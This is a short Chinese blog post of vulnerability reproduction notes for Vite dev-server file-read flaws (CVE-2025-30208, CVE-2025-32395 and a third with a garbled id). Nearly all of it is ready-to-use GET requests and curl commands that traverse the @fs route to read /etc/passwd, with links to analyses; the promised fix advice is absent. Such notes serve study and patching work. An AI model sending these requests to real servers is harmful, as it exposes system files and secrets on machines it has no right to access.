---
title: Vite 漏洞复现
date: 2025-06-05 10:00:00
author: Xendr1a
categories: [CVE复现]
tags: [Vite, CVE]
description: Vite 漏洞复现：环境、复现步骤与修复建议。
toc: true
---

## Vite

CVE-2025-30208

```text
GET /@fs/etc/passwd?raw??
GET /@fs/etc/passwd?import&raw??
```

例题TGCTF2025前端GAME

[【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客](https://blog.csdn.net/IDHALASHAO/article/details/146611941)

CVE-s0s5-31486

```text
POC 1：
仅影响Vite 6.0及以上版本（即>=6.0.0的受影响版本）；
仅当被读取的文件大小小于build.assetsInlineLimit配置值时（默认值为4KB）。
curl "http://localhost:5173/etc/passwd?.svg?.wasm?init"

POC 2：
需要知道Vite所在的绝对路径
# 这里的/x/x/x/vite-project/是指Vite所在的绝对路径
curl "http://localhost:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw"
```

[https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw**&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw**&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect)

## CVE-2025-32395

```text
# 这里的/x/x/x/vite-project/是指Vite所在的绝对路径
curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/
```

[复现与修复指南：Vite再次bypass（CVE-2025-32395）](https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA)
